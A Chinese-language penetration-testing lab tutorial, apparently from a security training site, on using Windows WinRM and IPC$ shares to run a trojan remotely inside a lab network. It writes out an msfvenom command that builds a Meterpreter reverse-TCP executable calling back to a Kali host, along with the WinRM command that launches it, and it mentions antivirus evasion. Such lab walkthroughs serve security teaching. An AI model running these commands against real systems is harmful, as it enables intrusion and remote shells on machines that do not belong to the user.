原创：Jaky合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

0x00:前言

WinRM是Windows Remote Managementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。

Server2008R2及往上的系统中默认中都开启该服务，从Server2012系统后开始，该WinRM服务便被设置为默认开启。Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认开启WinRM服务。

WinRM的好处在于，这种远程连接不容易被察觉到，也不会占用远程连接数！

0x01:环境准备

  1. WinRM会用到5985、5986 端口，所以防火墙必须做开放处理。  

  2. 用Administrator账户登录攻击机器  

  3. 前提知道被攻击方的用户登录账户密码  

  4. Windows操作系统中，默认是开启共享IPC$的  

  5. IP:192.168.124.30(server2016)   

IP:192.168.124.20(win7)

IP:192.168.124.32(Kali)

0x02:攻击过程

一、快速在(server2016)运行winrm

命令：winrm quickconfig

![v2-9942827dd926085c2c3823f9fe1b2aae_r.jp](https://pic2.zhimg.com/v2-9942827dd926085c2c3823f9fe1b2aae_r.jpg)

二、net use连接(win7)

命令：net use
[\\\192.168.124.20\ipc$](https://zhuanlan.zhihu.com/%5C%5C%5C%5C192.168.124.124%5C%5Cipc%24)
“密码” /user:“用户名”

![v2-759ae74ec270352712ceab6409bb7fbc_r.jp](https://pic4.zhimg.com/v2-759ae74ec270352712ceab6409bb7fbc_r.jpg)

尝试调用本地”calc.exe”.

![v2-2144cdd2a542a24145c5f148b26b37e1_r.jp](https://pic2.zhimg.com/v2-2144cdd2a542a24145c5f148b26b37e1_r.jpg)

成功

  1. 在(win7)中需要被远程访问的文件，开启文件共享。  

![v2-ae3029559bf0d2862c53f0a01d11b621_r.jp](https://pic4.zhimg.com/v2-ae3029559bf0d2862c53f0a01d11b621_r.jpg)

开启共享文件夹，并添加访问用户的权限，使其能够远程访问。

四、在（win7）中放置木马，并且用（kali）接收反弹的shell

  1. 生成shellcode   

msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.124.32
lport=7777 -f exe -o ./luomiweixiong.exe

![v2-7ff853a722f099b265eb82dc0d7c7b5f_r.jp](https://pic1.zhimg.com/v2-7ff853a722f099b265eb82dc0d7c7b5f_r.jpg)

  1. 把”luomiweixiong.exe”放在(win7)的C盘根目录.  

![v2-9ea60f950bc4480b8d57293aee4a7993_r.jp](https://pic3.zhimg.com/v2-9ea60f950bc4480b8d57293aee4a7993_r.jpg)

3、kali启动监听shell模式

![v2-83fa228dd9b92b11868601d854b4c1bc_r.jp](https://pic4.zhimg.com/v2-83fa228dd9b92b11868601d854b4c1bc_r.jpg)

  1. 利用(server2016）的WinRM 实现内网无文件攻击反弹shell  

  2. 在（server2016）中执行以下命令  

winrm invoke create wmicimv2/win32_process
@{commandline="\\\192.168.12.20\c\luomiweixiong.exe"}

![v2-9927d3c3de21497e9d5f14eafa6d8590_r.jp](https://pic4.zhimg.com/v2-9927d3c3de21497e9d5f14eafa6d8590_r.jpg)

![v2-6c56224dfa853b01571aec77b881bdb4_r.jp](https://pic4.zhimg.com/v2-6c56224dfa853b01571aec77b881bdb4_r.jpg)

![v2-35c1fd7338b113dbcd121db093761ba6_r.jp](https://pic2.zhimg.com/v2-35c1fd7338b113dbcd121db093761ba6_r.jpg)

反弹成功

0x03:总结

  1. shellcode还可以做一些免杀处理，使其更加的完美。  

  2. （有待大佬们再次总结）  

0x05:实操推荐（免费学习）

Kali之内网渗透：通过本实验课学习到通过Kali如何破解WIFI密码，利用Metasploit这个强大的渗透测试框架进行内网渗透。

点击：[实验:公开课第七期|Kali之内网渗透
老司机开车带你上路(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID08ff-71f1-4008-8ed2-3ba31045e6b4)开始做实验哦（PC端操作最佳哟）

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！

